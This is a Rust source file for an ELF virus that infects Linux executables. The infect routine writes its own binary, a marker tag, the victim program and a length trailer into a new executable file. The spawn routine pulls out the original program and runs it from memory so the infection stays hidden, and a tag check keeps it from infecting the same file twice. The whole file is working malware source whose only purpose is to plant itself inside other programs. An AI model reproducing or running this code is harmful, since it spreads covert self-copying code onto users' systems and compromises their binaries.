use std::env::{args, current_exe, vars};
use std::fs::{File, read};
use std::io::{Read, Write};
use std::os::unix::fs::PermissionsExt;
use clap::Parser;
use memfd_exec::MemFdExecutable;

#[derive(Parser, Debug)]
struct Args {
    victim_path: String,
    output_path: String,
}

const TAG: &str = "viktor var her.";

pub fn infect_victim() {
    let args = Args::parse();

    let victim_is_elf = check_if_elf(&args.victim_path);
    match victim_is_elf {
        true => println!("{} is an elf file!", args.victim_path),
        false => println!("{} is not an elf file...", args.victim_path),
    };

    let victim_path = &args.victim_path;
    let output_path = &args.output_path;

    assert!(victim_is_elf);
    let mut target_file =
        File::create(output_path).expect(&format!("Failed to create new file {}", output_path));

    let own_path = current_exe().expect("Failed to find my own path...");
    let mut own_contents: Vec<u8> = read(own_path).expect("Failed to read myself...");
    set_tag(&mut own_contents);

    target_file
        .write_all(&own_contents)
        .expect(&format!("Failed to write to new file {}", output_path));

    let victim_contents: Vec<u8> =
        read(victim_path).expect(&format!("Failed to open {}", victim_path));

    target_file
        .write_all(&victim_contents)
        .expect(&format!("Failed to write to new file {}", output_path));

    let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
    target_file
        .write_all(&payload_length)
        .expect(&format!("Failed to write to new file {}", output_path));
    target_file
        .set_permissions(PermissionsExt::from_mode(0o755))
        .expect("Failed to set permissions");
}

pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
    let own_path = current_exe()?;
    let own_contents: Vec<u8> = read(own_path)?;

    let binary_size = own_contents.len();
    let payload_length_offset = binary_size - 8;
    let payload_length = usize::from_le_bytes(own_contents[payload_length_offset..].try_into()?);
    let real_binary_start = payload_length;
    let real_binary_end = payload_length_offset;
    let executable = &own_contents[real_binary_start..real_binary_end];

    let argv: Vec<String> = args().collect();
    let env: Vec<(String, String)> = vars().collect();
    let _ = MemFdExecutable::new(&argv[0], executable)
        .envs(env)
        .args(&argv[1..])
        .spawn();
    Ok(())
}

pub fn is_already_infected() -> bool {
    let own_path = current_exe().expect("Failed to find my own path...");
    let own_contents = read(&own_path).expect(&format!("Failed to open myself..."));

    let infect_tag_str = TAG.to_uppercase();
    let infect_tag = infect_tag_str.as_bytes();

    let tag_len = infect_tag.len();
    match own_contents
        .windows(tag_len)
        .position(|window| window == infect_tag)
    {
        Some(_) => true,
        None => false,
    }
}

fn set_tag(file_contents: &mut [u8]) {
    let tag_bytes: &[u8] = TAG.as_bytes();
    let tag_len = tag_bytes.len();
    if let Some(tag_index) = file_contents
        .windows(tag_len)
        .position(|window| window == tag_bytes)
    {
        for byte in file_contents[tag_index..tag_index + tag_len].iter_mut() {
            if *byte == 0x20 {
                continue;
            }
            *byte = *byte ^ 0x20;
        }
    }
}

fn check_if_elf(file_path: &str) -> bool {
    let elf_magic_number = [0x7f, 0x45, 0x4c, 0x46];
    let mut magic_number = [0; 4];

    let mut suspect_file = File::open(file_path).expect(&format!("Failed to open {}", file_path));
    suspect_file
        .read(&mut magic_number)
        .expect(&format!("Failed to read {}", file_path));

    elf_magic_number == magic_number
}

